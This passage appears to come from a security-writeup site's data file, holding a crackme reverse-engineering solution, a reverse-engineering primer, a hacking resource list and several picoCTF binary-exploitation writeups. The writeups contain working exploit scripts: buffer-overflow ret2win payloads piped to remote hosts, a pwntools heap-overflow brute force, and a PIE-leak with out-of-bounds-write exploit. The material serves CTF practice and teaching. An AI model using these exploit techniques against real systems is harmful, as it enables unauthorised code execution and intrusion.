1373: 0f b6 34 01            movzbl (%rcx,%rax,1),%esi       # Load reference[i] (zero-extended)
1377: 83 f2 42                  xor    $0x42,%edx                      # XOR input[i] with 0x42
137a: 39 f2                       cmp    %esi,%edx                       # Compare with reference[i]
137c: 75 0f                        jne    138d                                   # Jump if not equal (fail)
137e: 48 ff c0                   inc    %rax                                    # i++
1381: 48 83 f8 17           cmp    $0x17,%rax                       # Compare i with 23
1385: 75 e8                       jne    136f                                    # Continue loop if i < 23
1387: b8 01 00 00 00      mov    $0x1,%eax                       # Return 1 (success)
138c: c3                             ret
138d: 31 c0                       xor    %eax,%eax                       # Return 0 (failure)
138f: c3                             ret


Critical Algorithm Discovery:
1. Loop through each of the 23 input characters
2. XOR each input character with 0x42
3. Compare result with corresponding byte in reference string at address 0x2110
4. All 23 comparisons must match for success

### Step 10: Extracting the Reference String

I extracted the reference data from the binary's read-only data section:

bash
objdump -s -j .rodata day4 | grep -A 10 2110


Output:
2110 21312639 732c3672 1d362a71 1d2f7673  !1&9s,6r.6*q./vs
2120 2c243076 2f713f                      ,$0v/q?


Hex Data Extraction:
- Address 0x2110: 21 31 26 39 73 2c 36 72 1d 36 2a 71 1d 2f 76 73
- Address 0x2120: 2c 24 30 76 2f 71 3f
- Total: 23 bytes (exactly matching the required input length)

### Step 11: Decryption Algorithm Implementation

I implemented the reverse of the validation algorithm:

python
# Reference string from binary
ref_hex = "21312639732c36721d362a711d2f76732c243076" + "2f713f"
ref_bytes = bytes.fromhex(ref_hex)

print(f"Reference length: {len(ref_bytes)}")  # Verify 23 bytes

# Reverse the XOR operation: if (input XOR 0x42) == reference, 
# then input == (reference XOR 0x42)
decoded = [byte ^ 0x42 for byte in ref_bytes]
access_code = ''.join(chr(x) for x in decoded)

print(f"Decoded access code: {access_code}")


Mathematical Verification:
- Original validation: (input[i] XOR 0x42) == reference[i]
- Reverse operation: input[i] == (reference[i] XOR 0x42)
- XOR is its own inverse: (A XOR B) XOR B == A

Result: csd{1nt0_th3_m41nfr4m3}

### Step 12: Final Validation and Testing

I tested the decoded access code:

bash
echo -n "csd{1nt0_th3_m41nfr4m3}" | LD_PRELOAD=./bypass_ptrace.so ./day4


Output:
NPLD Mainframe Authentication
Enter access code: Welcome to the mainframe, Operative. Jingle owes the elves a round.


I also verified it works without the ptrace bypass:

bash
echo -n "csd{1nt0_th3_m41nfr4m3}" | ./day4


Same successful output! This confirmed the access code was correct and the binary's normal execution path worked properly.

### Step 13: Comprehensive Technical Summary

Security Mechanisms Encountered:
1. Anti-debugging via ptrace() - Detected and blocked debugging attempts
2. Symbol stripping - Removed function names and debug information
3. Anti-tampering check - Verified integrity using magic value 0xdeadbeef
4. Input validation - Required exact 23-character length
5. Encryption - XOR cipher with key 0x42

`},{id:`intro`,title:`TryHackMe — Reverse Engineering Introduction`,excerpt:`TryHackMe introduction to reverse engineering covering fundamental concepts, tools setup, and basic binary analysis techniques for beginners.`,category:`Reverse Engineering`,content:`# TryHackMe — Reverse Engineering Introduction

> **Platform**: [TryHackMe](https://tryhackme.com) | **Topic**: Reverse Engineering Fundamentals | **Difficulty**: Beginner → Intermediate

---

## 1. What is Reverse Engineering?

**Reverse engineering** (RE) is the process of analyzing a compiled binary to understand what it does **without having access to the source code**.

### Why Learn RE?
| Use Case | Description |
|---|---|
| **Malware Analysis** | Understand what malicious software does, extract IOCs |
| **Vulnerability Research** | Find bugs in closed-source software |
| **CTF Competitions** | Solve crackmes, keygens, flag extraction challenges |
| **Software Security** | Audit binaries for backdoors, verify patches |
| **Exploit Development** | Understand program behavior to craft exploits |
| **Game Hacking** | Understand game internals (educational) |

---

## 2. Core Concepts

### Compilation Pipeline
\`\`\`
Source Code (.c/.cpp)
    |
    v
Preprocessor --> Compiler --> Assembler --> Linker
    |               |            |            |
  .i file       .s (asm)     .o (object)   ELF/PE binary
\`\`\`

### Key Terms
| Term | Definition |
|---|---|
| **Disassembly** | Converting machine code → assembly instructions |
| **Decompilation** | Converting machine code → pseudo-C code (approximate) |
| **Static Analysis** | Analyzing without executing (disassembler) |
| **Dynamic Analysis** | Analyzing while running (debugger) |
| **Debugging** | Stepping through code, examining memory/registers |
| **Patching** | Modifying binary instructions to change behavior |
| **ELF** | Executable and Linkable Format (Linux binaries) |
| **PE** | Portable Executable (Windows binaries) |

---

## 3. Essential RE Tools

### Disassemblers / Decompilers
| Tool | Platform | Cost | Best For |
|---|---|---|---|
| **Ghidra** | All | Free | Full RE with decompiler (NSA) |
| **IDA Pro** | All | $$$$ | Industry standard |
| **IDA Free** | All | Free | Disassembly only (no decompiler) |
| **Cutter** | All | Free | Rizin-based, modern UI |
| **Binary Ninja** | All | $$ | Clean HLIL decompiler |
| **radare2** | All | Free | CLI-based, scriptable |

### Debuggers
| Tool | Platform | Best For |
|---|---|---|
| **GDB + Pwndbg** | Linux | Binary exploitation, CTF |
| **GDB + GEF** | Linux | Similar to Pwndbg, different UI |
| **x64dbg** | Windows | Windows RE, malware analysis |
| **WinDbg** | Windows | Kernel debugging, crash analysis |
| **OllyDbg** | Windows | Legacy 32-bit debugging |

### Supporting Tools
| Tool | Purpose |
|---|---|
| \`file\` | Identify file type (ELF, PE, script, etc.) |
| \`strings\` / \`FLOSS\` | Extract readable text from binaries |
| \`ltrace\` | Trace library function calls |
| \`strace\` | Trace system calls |
| \`objdump\` | Disassemble sections, view headers |
| \`readelf\` | Parse ELF structure |
| \`checksec\` | Check binary protections (NX, ASLR, canary, PIE) |
| \`nm\` | List symbols in binary |
| \`ldd\` | List shared library dependencies |

---

## 4. x86/x64 Assembly Essentials

### Registers (x64)
| Register | Purpose | Notes |
|---|---|---|
| \`RAX\` | Return value, accumulator | Function return values |
| \`RBX\` | Base register | Callee-saved |
| \`RCX\` | Counter, 1st arg (Windows) / 4th arg (Linux) | Loop counter |
| \`RDX\` | Data, 2nd arg (Windows) / 3rd arg (Linux) | Division |
| \`RSI\` | Source index, 2nd arg (Linux) | String operations |
| \`RDI\` | Destination index, 1st arg (Linux) | String operations |
| \`RSP\` | Stack pointer | Always points to top of stack |
| \`RBP\` | Base pointer | Frame pointer |
| \`RIP\` | Instruction pointer | Next instruction to execute |
| \`R8-R15\` | General purpose (x64 only) | R8/R9 = 5th/6th args (Linux) |

### Calling Conventions
| Convention | Args 1-6 | Return | Caller/Callee Saved |
|---|---|---|---|
| **Linux x64 (System V)** | RDI, RSI, RDX, RCX, R8, R9 | RAX | Caller: RAX,RCX,RDX,R8-R11 |
| **Windows x64** | RCX, RDX, R8, R9 (+ shadow space) | RAX | Caller: RAX,RCX,RDX,R8-R11 |
| **Linux x86 (cdecl)** | Stack (right-to-left push) | EAX | Caller cleans stack |

### Essential Instructions
| Instruction | Meaning | Example |
|---|---|---|
| \`mov dst, src\` | Move/copy value | \`mov rax, rbx\` |
| \`push val\` | Push to stack (RSP -= 8) | \`push rbp\` |
| \`pop dst\` | Pop from stack (RSP += 8) | \`pop rbp\` |
| \`lea dst, [addr]\` | Load effective address (no dereference) | \`lea rax, [rbp-0x10]\` |
| \`call func\` | Push return addr, jump to function | \`call 0x401000\` |
| \`ret\` | Pop return addr, jump to it | Return from function |
| \`cmp a, b\` | Compare (sets flags, no store) | \`cmp eax, 0\` |
| \`test a, b\` | AND (sets flags, no store) | \`test eax, eax\` (check zero) |
| \`je/jz\` | Jump if equal/zero | After \`cmp\` |
| \`jne/jnz\` | Jump if not equal/not zero | After \`cmp\` |
| \`jmp addr\` | Unconditional jump | \`jmp 0x401050\` |
| \`xor a, a\` | Zero out register | \`xor eax, eax\` (eax = 0) |
| \`nop\` | No operation | NOP sled, padding |
| \`syscall\` | System call (x64 Linux) | After setting RAX = syscall # |
| \`int 0x80\` | System call (x86 Linux) | After setting EAX = syscall # |

---

## 5. Common RE Patterns

### Function Prologue & Epilogue
\`\`\`asm
; Prologue - sets up stack frame
push rbp          ; Save old base pointer
mov rbp, rsp      ; Set new base pointer
sub rsp, 0x20     ; Allocate 32 bytes for local variables

; ... function body ...

; Epilogue - tears down stack frame
leave             ; mov rsp, rbp; pop rbp
ret               ; Return to caller
\`\`\`

### If/Else Pattern
\`\`\`asm
cmp eax, 5        ; if (x == 5)
jne else_branch    ;   if not equal, jump to else
; ... then code ...
jmp end_if
else_branch:
; ... else code ...
end_if:
\`\`\`

### Loop Pattern
\`\`\`asm
mov ecx, 10       ; counter = 10
loop_start:
; ... loop body ...
dec ecx            ; counter--
jnz loop_start     ; if counter != 0, loop again
\`\`\`

### String Comparison
\`\`\`asm
lea rdi, [user_input]    ; arg1 = user input
lea rsi, [correct_pass]  ; arg2 = correct password
call strcmp               ; compare strings
test eax, eax            ; check result
je access_granted         ; if equal -> success
\`\`\`

---

## 6. RE Methodology for CTF

### Step 1: Reconnaissance
\`\`\`bash
file challenge           # What type of binary?
checksec challenge       # What protections?
strings challenge        # Any visible strings?
ltrace ./challenge       # What library calls?
\`\`\`

### Step 2: Static Analysis
\`\`\`bash
# Load into Ghidra or Cutter
# Find main()
# Read decompiled code
# Identify: input, validation logic, success/fail paths
\`\`\`

### Step 3: Dynamic Analysis
\`\`\`bash
# Load into GDB with Pwndbg
gdb ./challenge
> break main
> run
> step/next through code
> examine registers and memory
\`\`\`

### Step 4: Common CTF Challenges

| Challenge Type | What to Do |
|---|---|
| **Password check** | Find \`strcmp\`/custom compare, extract correct password |
| **XOR encryption** | Find XOR loop, extract key and ciphertext |
| **Flag in memory** | Run in debugger, break after decode, read memory |
| **Anti-debug** | Patch out \`ptrace\` / \`IsDebuggerPresent\` checks |
| **Keygen** | Understand validation algorithm, write keygen |
| **Obfuscated** | De-obfuscate: XOR strings, base64, custom encoding |
| **Packed** | Unpack first (UPX, custom), then analyze |
| **Multi-stage** | Follow execution flow through unpacking/decoding stages |

---

## 7. Linux Syscalls Reference (x86/x64)

### Common Syscalls
| Syscall | x86 (EAX) | x64 (RAX) | Purpose |
|---|---|---|---|
| \`read\` | 3 | 0 | Read from file descriptor |
| \`write\` | 4 | 1 | Write to file descriptor |
| \`open\` | 5 | 2 | Open file |
| \`close\` | 6 | 3 | Close file descriptor |
| \`execve\` | 11 | 59 | Execute program |
| \`exit\` | 1 | 60 | Exit process |
| \`mmap\` | 90 | 9 | Map memory |
| \`mprotect\` | 125 | 10 | Change memory protections |
| \`fork\` | 2 | 57 | Create child process |
| \`ptrace\` | 26 | 101 | Debug process (anti-debug target) |

---

## 8. Recommended TryHackMe Rooms for RE

| Room | Difficulty | Focus |
|---|---|---|
| **Intro to x86-64** | Easy | Assembly basics |
| **Reverse Engineering** | Easy | Basic RE methodology |
| **Crackme** | Easy-Medium | Password cracking |
| **Ghidra** | Medium | Using Ghidra for RE |
| **Radare2** | Medium | radare2 commands |
| **Buffer Overflow Prep** | Medium | Stack overflow basics |
| **Binex** | Medium | Binary exploitation |
| **Gatekeeper** | Medium | Real-world buffer overflow |
| **Brainstorm** | Hard | Advanced buffer overflow |
| **RE (Challenge)** | Hard | Put it all together |

---

## 9. Practice Path

\`\`\`
1. Learn x86 assembly basics (registers, instructions, stack)
2. Get comfortable with GDB + Pwndbg
3. Solve easy crackmes (crackmes.one)
4. Learn to use Ghidra/Cutter decompiler
5. Understand common vulnerability classes (BOF, format strings)
6. Progress to binary exploitation (pwntools, ROP)
7. Try malware analysis (combine static + dynamic RE)
\`\`\`

---

## Pro Tips

> **Read the decompiler output, not just assembly** — Ghidra's decompiler turns 50 lines of ASM into 10 lines of C. Start there, then verify with assembly when things look wrong.

> **Rename functions and variables as you go** — In Ghidra/IDA, press \`L\` to rename. \`FUN_004010a0\` means nothing. \`check_password\` means everything.

> **Dynamic > Static for beginners** — When stuck, run it in GDB. Set breakpoints before and after interesting code. Examine registers. Watch values change in real-time.

> **Learn to read compiler patterns** — Compilers generate predictable code for \`if/else\`, \`for\`, \`while\`, \`switch\`. Once you recognize the patterns, RE becomes much faster.


`},{id:`hacking-resources`,title:`Hacking Resources & Bookmarks`,excerpt:`Curated collection of hacking and cybersecurity resources including learning platforms, tools, reference materials, and practice environments.`,category:`Resources`,content:`# Hacking Resources & Bookmarks
> Source: [Crypto-Cat CTF Resources](https://github.com/Crypto-Cat/CTF#readme) | [HackTricks](https://book.hacktricks.wiki/)

---

## Reference Wikis
- [HackTricks](https://book.hacktricks.wiki/en/index.html) — Pentesting methodology, binary exploitation, web vulns, crypto, stego
- [HackTricks Cloud](https://cloud.hacktricks.wiki/) — AWS, GCP, Azure, Kubernetes, CI/CD
- [GTFOBins](https://gtfobins.org/) — Unix binary privesc
- [OWASP](https://owasp.org/) — Web security standards

---

## Tools

| Tool | Purpose | Link |
|---|---|---|
| **Ghidra** | Reverse engineering (NSA) | [GitHub](https://github.com/NationalSecurityAgency/ghidra) |
| **Pwntools** | CTF exploit framework (Python) | [Tutorial](https://github.com/Gallopsled/pwntools-tutorial) |
| **CyberChef** | Encoding/decoding/crypto Swiss knife | [Online](https://gchq.github.io/CyberChef/) |
| **Volatility** | Memory forensics | [Wiki](https://github.com/volatilityfoundation/volatility/wiki/Linux) |
| **Nuclei** | Vulnerability scanner | [GitHub](https://github.com/projectdiscovery/nuclei) |
| **ExploitDB** | Public exploit database | [exploit-db.com](https://www.exploit-db.com/) |
| **RevShells** | Reverse shell generator | [revshells.com](https://www.revshells.com/) |
| **DCode** | Cipher/code decoder | [dcode.fr](https://www.dcode.fr/en) |
| **Decompiler** | Online decompilation | [decompiler.com](https://www.decompiler.com/) |
| **TIO** | Run code online (200+ langs) | [tio.run](https://tio.run/) |

---

## YouTube Channels (Security)

| Channel | Focus |
|---|---|
| [John Hammond](https://www.youtube.com/@_JohnHammond) | CTF, malware analysis |
| [Low Level](https://www.youtube.com/@LowLevelTV) | Systems programming, RE |
| [LiveOverflow](https://www.youtube.com/@LiveOverflow) | Binary exploitation, browser hacking |
| [IppSec](https://www.youtube.com/@ippsec) | HackTheBox walkthroughs |
| [PwnFunction](https://www.youtube.com/@PwnFunction) | Web security animations |
| [StackSmashing](https://www.youtube.com/@stacksmashing) | Hardware hacking, RE |
| [LaurieWired](https://www.youtube.com/@lauriewired) | Malware RE |
| [CryptoCat](https://www.youtube.com/@_CryptoCat) | CTF walkthroughs, pwn tutorials |
| [HackerSploit](https://www.youtube.com/@HackerSploit) | Pentesting tutorials |
| [TheCyberMentor](https://www.youtube.com/@TCMSecurityAcademy) | Ethical hacking, OSCP |
| [NahamSec](https://www.youtube.com/@NahamSec) | Bug bounty |
| [GuidedHacking](https://www.youtube.com/@GuidedHacking) | Game hacking, RE |

---

## More Resources
- [Learn RE](https://hshrzd.wordpress.com/how-to-start/) — How to start reverse engineering
- [Learn BinExp (Nightmare)](https://guyinatuxedo.github.io/) — Binary exploitation course
- [Awesome CTF](https://github.com/apsdehal/awesome-ctf) — Curated CTF resources
- [Bug Bounty Resources](https://www.hacker101.com/resources.html) — Hacker101
- [Bug Bounty Platforms](https://github.com/disclose/bug-bounty-platforms) — Platform list
- [Awesome Forensics](https://cugu.github.io/awesome-forensics/) — DFIR tools & resources
- [0xdf Writeups](https://0xdf.gitlab.io/) — HackTheBox writeups
- [OWASP MASTG](https://mas.owasp.org/MASTG/) — Mobile security testing guide

---

## HackTricks Quick Navigation

### Binary Exploitation
- [Methodology](https://book.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html)
- [Stack Overflow](https://book.hacktricks.wiki/en/binary-exploitation/stack-overflow/index.html)
- [Format Strings](https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html)
- [Libc Heap](https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html)
- [Protections & Bypasses](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)
- [Write-What-Where → Exec](https://book.hacktricks.wiki/en/binary-exploitation/arbitrary-write-2-exec/index.html)

### Pentesting
- [Pentesting Methodology](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-methodology.html)
- [Linux PrivEsc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)
- [Windows PrivEsc](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [Active Directory](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [Web Vulnerabilities](https://book.hacktricks.wiki/en/pentesting-web/web-vulnerabilities-methodology.html)

### Other
- [Reversing Tools](https://book.hacktricks.wiki/en/reversing/reversing-tools-basic-methods/index.html)
- [Common Malware APIs](https://book.hacktricks.wiki/en/reversing/common-api-used-in-malware.html)
- [Crypto](https://book.hacktricks.wiki/en/crypto/index.html)
- [Stego](https://book.hacktricks.wiki/en/stego/index.html)
- [Forensics](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/index.html)
`},{id:`01-quizploit-writeup`,title:`Quizploit Writeup`,excerpt:`picoCTF Quizploit writeup exploiting a quiz application through buffer overflow to redirect execution and capture the flag.`,category:`picoCTF - Binary Exploitation`,content:'# Quizploit Writeup\n\nHere is the exact writeup of how I solved it, step by step, including the tools I used.\n\n## Files and tools used\n\n- Files: `vuln`, `vuln.c`\n- Tools:\n- `file`\n- `checksec`\n- `objdump`\n- `gdb-pwndbg`\n- `nc`\n\n## 1) Inspect binary basics\n\n```bash\nfile vuln\n```\n\nFrom this, answer architecture/linking/stripped questions.\n\n## 2) Check protections\n\n```bash\nchecksec --file=vuln\n```\n\nUse this for NX/protection questions.\n\n## 3) Read source for buffer and read size\n\n```bash\ncat vuln.c\n```\n\nExtract:\n- buffer size in `vuln()`\n- input read size\n- overflow amount (`read_size - buffer_size`)\n\n## 4) Confirm symbols and `win` function\n\n```bash\nobjdump -d vuln | rg "<win>|<vuln>|<main>"\n```\n\nOr in GDB:\n\n```bash\ngdb-pwndbg vuln\ninfo functions\n```\n\n## 5) Connect and answer quiz\n\n```bash\nnc lonely-island.picoctf.net 56027\n```\n\nI answered using values collected from the commands above.\n\n## Final answers used (solved run)\n\n- `64-bit`\n- `dynamic`\n- `not stripped`\n- `0x15`\n- `0x90`\n- `yes`\n- `fgets`\n- `win`\n- `buffer overflow`\n- `0x7b`\n- `NX`\n- `ROP`\n- `0x401176`\n\n## Final flag\n\n`picoCTF{<redacted>}`\n'},{id:`02-echo-escape-2-writeup`,title:`Echo Escape 2 Writeup`,excerpt:`picoCTF Echo Escape 2 writeup using format string vulnerabilities to leak and overwrite memory for shell access.`,category:`picoCTF - Binary Exploitation`,content:`# Echo Escape 2 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`vuln (1)\`, \`vuln (1).c\`
- Tools:
- \`file\`
- \`checksec\`
- \`objdump\`
- \`python3\`
- \`nc\`

## 1) Inspect the binary

\`\`\`bash
file "vuln (1)"
checksec --file="vuln (1)"
\`\`\`

Observed a 32-bit non-PIE target suitable for ret2win.

## 2) Find \`win()\` address

\`\`\`bash
objdump -d "vuln (1)" | rg "<win>"
\`\`\`

Address used:
- \`0x08049276\`

## 3) Calculate EIP overwrite offset

\`\`\`bash
objdump -d "vuln (1)" | sed -n '/<vuln>:/,/^$/p'
\`\`\`

Stack math:
- buffer at \`ebp-0x28\`
- saved return at \`ebp+0x4\`
- offset = \`0x28 + 0x4 = 0x2c\` = \`44\`

## 4) Build payload

\`\`\`bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I",0x08049276) + b"\\n")'
\`\`\`

## 5) Exploit remote

\`\`\`bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I",0x08049276) + b"\\n")' | nc dolphin-cove.picoctf.net 53772
\`\`\`

## Why it works

\`fgets(buf, 128, stdin)\` overflows \`buf\`, overwrites saved return address, and returns into \`win()\`.

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`03-tea-cash-writeup`,title:`tea-cash Writeup`,excerpt:`picoCTF Tea-Cash writeup exploiting a virtual currency application through integer overflow or logic flaws to gain unauthorized funds.`,category:`picoCTF - Binary Exploitation`,content:`# tea-cash Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`heapedit\`, \`heapedit.c\`
- Tools:
- \`cat\`
- \`nc\`
- \`python3\` (for address arithmetic helper)

## 1) Understand program logic

\`\`\`bash
cat heapedit.c
\`\`\`

Program behavior:
- allocates 6 chunks of size \`0x80\`
- stores flag in chunk 6
- frees chunks in reverse order
- asks you to provide the expected free-list traversal addresses

## 2) Connect to remote

\`\`\`bash
nc candy-mountain.picoctf.net 50072
\`\`\`

Read the printed tcache head:
- \`tcache head (start of free list) -> 0x...\`

## 3) Compute required addresses

Chunk stride is:
- \`0x80\` user data + \`0x10\` metadata = \`0x90\`

Enter six addresses:
- \`head + 0x000\`
- \`head + 0x090\`
- \`head + 0x120\`
- \`head + 0x1b0\`
- \`head + 0x240\`
- \`head + 0x2d0\`

Helper:

\`\`\`bash
python3 - << 'PY'
head = int('0x1fc1490',16)
for d in [0,0x90,0x120,0x1b0,0x240,0x2d0]:
    print(hex(head+d))
PY
\`\`\`

## 4) Submit and get flag

After correct traversal, service prints \`Correct traversal! Flag: ...\`

## Note about local behavior

Local glibc may use safe-linking and break this exact pointer expectation, while remote instance was solvable with plain traversal.

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`04-echo-escape-1-writeup`,title:`Echo Escape 1 Writeup`,excerpt:`picoCTF Echo Escape 1 writeup leveraging format string bugs in an echo service to read sensitive memory and extract the flag.`,category:`picoCTF - Binary Exploitation`,content:`# Echo Escape 1 Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`vuln (2)\`, \`vuln (2).c\`
- Tools:
- \`file\`
- \`checksec\`
- \`objdump\`
- \`python3\`
- \`nc\`

## 1) Inspect binary

\`\`\`bash
file "vuln (2)"
checksec --file="vuln (2)"
\`\`\`

## 2) Find \`win()\` address

\`\`\`bash
objdump -d "vuln (2)" | rg "<win>"
\`\`\`

Used address:
- \`0x401256\`

## 3) Compute RIP offset

\`\`\`bash
objdump -d "vuln (2)" | sed -n '/<main>:/,/^$/p'
\`\`\`

Offset calculation:
- buffer \`32\` bytes
- saved \`RBP\` \`8\` bytes
- saved RIP offset = \`40\`

## 4) Build payload

\`\`\`text
"A" * 40 + p64(0x401256)
\`\`\`

## 5) Exploit remote

\`\`\`bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q",0x401256))' | nc mysterious-sea.picoctf.net 53046
\`\`\`

## Why it works

\`read(0, buf, 128)\` overflows \`buf[32]\` and overwrites return address with \`win()\`.

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`05-heap-havoc-writeup`,title:`Heap Havoc Writeup`,excerpt:`picoCTF Heap Havoc writeup exploiting heap memory management flaws including use-after-free or heap overflow to gain code execution.`,category:`picoCTF - Binary Exploitation`,content:`# Heap Havoc Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`vuln (3)\`, \`vuln (3).c\`
- Tools:
- \`file\`
- \`checksec\`
- \`objdump\`
- \`python3\`
- \`pwntools\`
- \`nc\`

## 1) Review vulnerability

Source behavior:
- \`i1->name = malloc(8)\`
- \`i2->name = malloc(8)\`
- \`strcpy(i1->name, argv[1])\` and \`strcpy(i2->name, argv[2])\`

Unbounded \`strcpy\` allows overflowing from \`i1->name\` into \`i2\`, including \`i2->callback\`.

## 2) Find \`winner()\` address

\`\`\`bash
objdump -d "vuln (3)" | rg "<winner>"
\`\`\`

Used:
- \`winner = 0x080492b6\`

## 3) Build overwrite strategy

Goal:
- keep \`i2->name\` valid enough for second \`strcpy\`
- set \`i2->callback = winner\`

Because heap layout can shift, use a short brute-force over padding length.

## 4) Exploit with pwntools

\`\`\`python
from pwn import *

win = 0x080492b6
name_ptr = 0x0804c041

for off in range(8, 40):
    io = remote('foggy-cliff.picoctf.net', 50888)
    io.recvuntil(b'space:')
    arg1 = b'A'*off + b'PPPP' + p32(name_ptr) + p32(win)
    arg2 = b'BBBB'
    io.sendline(arg1 + b' ' + arg2)
    out = io.recvrepeat(1)
    if b'picoCTF{' in out:
        print(out.decode('latin-1','replace'))
        break
    io.close()
\`\`\`

Working offset in solved run:
- \`16\`

## Why it works

Overflow corrupts \`i2\` object fields, callback becomes non-null and points to \`winner\`, then \`if (i2->callback) i2->callback();\` executes flag function.

## Final flag

\`picoCTF{<redacted>}\`
`},{id:`06-pizza-router-writeup`,title:`Pizza Router Writeup`,excerpt:`picoCTF Pizza Router writeup exploiting a routing application through buffer overflow or command injection to capture the flag.`,category:`picoCTF - Binary Exploitation`,content:`# Pizza Router Writeup

Here is the exact writeup of how I solved it, step by step, including the tools I used.

## Files and tools used

- Files: \`router\`, \`city1.map\`, \`city2.map\`, \`city3.map\`
- Tools:
- \`file\`
- \`checksec\`
- \`strings\`
- \`nm\`
- \`objdump\`
- \`python3\`
- \`pwntools\`
- \`nc\`

## 1) Recon the binary

\`\`\`bash
file router
checksec --file=router
strings -n 4 router | rg "help|add_order|reroute|replay|receipt|dispatch"
nm -n router
\`\`\`

Findings:
- PIE enabled
- hidden \`win\` at offset \`0x2460\`
- command surface includes leaks + mutation operations

## 2) Identify useful leaks and bug

From reversing behavior:
- \`replay <id>\` leaks callback pointer: \`renderer=%p\` (PIE leak)
- \`receipt <id>\` leaks state pointer: \`hint=%p\` (heap leak)
- \`reroute <id> <heap_idx> <new_cost>\` has out-of-bounds index behavior

## 3) Exploit plan

1. Create order.
2. Leak renderer pointer and compute PIE base.
3. Leak state pointer.
4. Use OOB writes to redirect callback to \`win()\`.
5. Trigger callback via \`dispatch\`.

## 4) Key offsets used

- \`base = renderer - 0x2260\`
- \`win = base + 0x2460\`
- write base in state: \`state + 0x18\`
- callback target: \`state + 0x438\`
- callback index: \`(0x438 - 0x18)/8 = 132\`

## 5) Working exploit script

\`\`\`python
from pwn import *
import re

HOST='mysterious-sea.picoctf.net'
PORT=65154

def i32(x):
    x &= 0xffffffff
    return x if x < 0x80000000 else x-0x100000000

io = remote(HOST, PORT)
io.recvuntil(b'router> ')

def cmd(s):
    io.sendline(s)
    return io.recvuntil(b'router> ', drop=True)

out = cmd(b'add_order 1 1')
oid = int(re.search(rb'order #(\\d+)', out).group(1))

rep = cmd(f'replay {oid}'.encode())
renderer = int(re.search(rb'renderer=(0x[0-9a-fA-F]+)', rep).group(1),16)
base = renderer - 0x2260
win = base + 0x2460

rcpt = cmd(f'receipt {oid}'.encode())
state = int(re.search(rb'hint=(0x[0-9a-fA-F]+)', rcpt).group(1),16)

heap_base = state + 0x18
ord0 = base + 0x5080
idx_to_ord0 = (ord0 - heap_base)//8

x_over = ((win & 0xffffffff) - 16) & 0xffffffff
cmd(f'reroute {oid} {idx_to_ord0} {i32(x_over)}'.encode())
cmd(f'reroute 17 132 {i32((win>>32)&0xffffffff)}'.encode())

out = cmd(b'dispatch 17')
print(out.decode('latin-1','replace'))
\`\`\`

## 6) Result

The challenge instance returned:
- \`flag{<redacted>}\`

Note: this instance returned \`flag{<redacted>}\` format (not \`picoCTF{<redacted>}\`).
`},{id:`07-offset-cycle-writeup`,title:`offset-cycle Writeup`,excerpt:`picoCTF Offset Cycle writeup solving a binary exploitation challenge involving cyclic offset calculation and return address control.`,category:`picoCTF - Binary Exploitation`,content:`# offset-cycle Writeup

## Challenge

SSH target:

\`\`\`bash
ssh -p 59476 ctf-player@green-hill.picoctf.net
\`\`\`

Password:

\`\`\`text
83dcefb7
\`\`\`

## Goal

Exploit the generated SUID binary within 120 seconds and recover the flag.

## Remote Setup

After logging in, the home directory contained:

- \`instructions.txt\`
- \`start\`
- \`CodeBank/\` (not directly readable)

The instructions explained the flow:

1. Run \`./start\`
2. It copies a generated C source file and compiled binary into the current directory
3. The files are deleted after 120 seconds
4. If the binary is exploited in time, it reveals the flag

## Generated Instance

Running \`./start\` produced:

- \`11.c\`
- \`11\`

The generated C source was:

\`\`\`c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 68
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "You may not have plenty of time",
                    "to solve the challenge.\\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\\n", get_return_address());
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
\`\`\`

## Vulnerability

This is a classic ret2win challenge:

- \`gets(buf)\` allows unbounded stack input
- \`win()\` prints the flag from \`CodeBank/flag.txt\`
- the binary is 32-bit and non-PIE, so the \`win()\` address is fixed

Security properties of the generated binary:

\`\`\`text
Arch: i386
RELRO: Partial RELRO
Canary: No
NX: Stack executable
PIE: No
Stripped: No
\`\`\`

## Important Addresses

From \`nm -n 11\`:

\`\`\`text
080491f6 T win
08049281 T vuln
080492c4 T main
\`\`\`

So the target address was:

\`\`\`text
win = 0x080491f6
\`\`\`

## Offset Calculation

At first glance the source suggests:

- \`buf[68]\`
- saved \`ebp\` = 4 bytes
- return address after 72 bytes

But the compiled binary had extra stack layout due to a saved \`ebx\`.

Disassembly of \`vuln\`:

\`\`\`asm
08049281 <vuln>:
  push   ebp
  mov    ebp, esp
  push   ebx
  sub    esp, 0x54
  ...
  lea    eax, [ebp-0x4c]
  push   eax
  call   gets
  ...
  leave
  ret
\`\`\`

The buffer starts at \`ebp-0x4c\`.

